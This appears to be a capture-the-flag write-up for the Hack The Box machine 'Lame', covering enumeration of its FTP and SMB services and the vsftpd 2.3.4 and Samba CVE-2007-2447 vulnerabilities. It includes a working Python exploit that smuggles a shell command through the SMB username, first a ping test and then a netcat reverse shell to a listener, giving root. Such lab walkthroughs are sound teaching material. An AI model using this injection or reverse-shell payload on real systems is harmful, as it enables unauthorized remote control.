This box has two relatively wellknown CVEs for FTP and SMB services running on it. We must focuse on both of them in order to get to *ROOT*. 

## NMAP

Start with NMAP scan and run default scripts on open ports:
``` terminal
$ sudo nmap -sV -sC -O -p21,22,139,445 10.10.10.3 -oA tcp-full-scan
```
![nmap-scan](/assets/img/sample/htb-lame-nmap-scan.png)
SSH, FTP and SMB services are open on the box.
### FTP
FTP server is running vsftpd v2.3.4. and anonymouse login is allowed. Access the ftp server:
``` terminal
$ ftp 10.10.10.3
```
![ftp-enum](/assets/img/sample/htb-lame-ftp.png)
There is no data hosted on the server and no write access. Searching the internet for vsftpd v2.3.4 reveals critical vulnerability that vsftpd v2.3.4 has a [**Backdoor in its source code [CVE-2011-2523]**](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523). This backdoor opens a shell on port 6200/tcp.
> The backdoor payload is interesting. In response to a :) smiley face in the FTP username, a TCP callback shell is attempted. There is no obfuscation. More interestingly, there's no attempt to broadcast any notification of installation of the bad package. So it's unclear how victims would be identified; and also pretty much guaranteed that any major redistributor would notice the badness. Therefore, perhaps someone was just having some lulz instead of seriously trying to cause trouble.

So we should definitely exploit it :). we have `nmap` script to verify this CVE.
```terminal
$ sudo nmap --script=ftp-vsftpd-backdoor -p 21 10.10.10.3
```
![ftp-backdoor-scan](/assets/img/sample/htb-lame-ftp-script.png)
hmm... the script didnt return any output. This scripts runs the `id` command on target host and returns the output if successful. ==Something looks wrong==. 

Now **Metasploit** also has a script to exploit this vulnerability but to be sure do it manually. Here are the steps:
1. run `tcpdump` on ethernet interface.
```terminal
$ sudo tcpdump -nntttt -i tun0
```
2. login to ftp server with username `:)`

So far, it surely looks like a rabbit hole. Move on to next port for now.

### SMB
SMB is running v3.0.20-Debian on server and message signing is also diabled. Check for Null session first.
``` terminal
$ smbmap -H 10.10.10.3
```
![smb-enum](/assets/img/sample/htb-lame-smb-list.png)
Server allows **READ,WRITE** access on **tmp** folder. Now recursively list all the contents of this directory:
``` terminal
$ smbmap -H 10.10.10.3 -R tmp
```
![smb-enum-tmp](/assets/img/sample/htb-lame-smb-tmp.png)
There is no meaningful information in shared data.

Google search for SMB v3.0.20 shows that it has a [**Remote Command Injection Vulnerability [CVE-2007-2447]**](https://nvd.nist.gov/vuln/detail/CVE-2007-2447).
> The MS-RPC functionality in smbd in Samba 3.0.0 through 3.0.25rc3 allows remote attackers to execute arbitrary commands via shell metacharacters involving the (1) SamrChangePassword function, when the "username map script" smb.conf option is enabled, and allows remote authenticated users to execute commands via shell metacharacters involving other MS-RPC functions in the (2) remote printer and (3) file share management.

## Getting Shell
**Metasploit** has a builtin script for this exploit, but this vulnerability is pretty straight forward. AND.. there is no fun in that. LAME!!!!!

Root cause of this CVE is the unfiltered information parsed by `/bin/sh` which is provided to MS-RPC(port 139) and is supposed to be used for running non-default scripts. so it is possible to run any command without needing any Authentication.

### CVE-2007-2447 Script

Let's write the script in *Python3*. We need to get `pysmb` library to authenticate with smb. The exploit script does not need anything more than a *RPC Connect Request*. 

Write a simple POC:

```python
#!/usr/bin/env python3
from smb.SMBConnection import SMBConnection
SMBConnection(
	"/=`nohup ping -c 3 10.10.14.33`", 
    "", 
    "", 
    "",
).connect("10.10.10.3", 139)
```
Listen on **tun0** with `tcpdump` and execute script.

![smb-enum](/assets/img/sample/htb-lame-smb-pingreply.png)
We get a ping reply which confirms *Arbitrary Code Execution*. Replace payload with reverse shell. Generate Shellcode for payload with `msfvenom`. 
```terminal
$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.33 LPORT=2222 EXITFUNC=thread
```
![payload-with-msfvenom](/assets/img/sample/htb-lame-msfvenom.png)
Now replace the `ping` command in Python script with netcat reverse shell payload
```python
from smb.SMBConnection import SMBConnection

SMBConnection(
    "/=`nohup mkfifo /tmp/lmzf; nc 10.10.14.33 2222 0</tmp/lmzf | /bin/sh >/tmp/lmzf 2>&1; rm /tmp/lmzf`",
    "",
    "",
    "",
).connect("10.10.10.3", 139)
```
Open `netcat` listener on port `2222` and execute script.

And finally we have the Root Shell!! Lame! :)
